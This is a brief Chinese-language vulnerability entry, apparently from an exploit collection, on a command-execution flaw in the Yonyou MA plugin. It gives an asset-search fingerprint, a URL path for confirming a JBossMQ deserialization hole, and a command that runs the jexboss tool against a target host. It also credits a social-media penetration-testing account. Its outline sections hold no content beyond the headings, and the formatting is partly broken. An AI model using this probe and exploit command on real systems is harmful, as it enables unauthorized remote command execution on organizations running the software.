# 用友MA插件存在命令执行漏洞

- **系统**：用友　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="用友-MA插件"`

**请求体 / payload**
```
在url后面添加如下地址：`/jbossmq-httpil/HTTPServerILServlet`，出现如下页面即证明存在JbossMQ反序列化漏洞\

使用工具利用\
\[jexboss-master.zip]\(公众号：渗透安全HackTwo
python3 jexboss.py -host http://xx.xx.xx.xx/

```

**其他**
- 用友MA插件存在命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友MA插件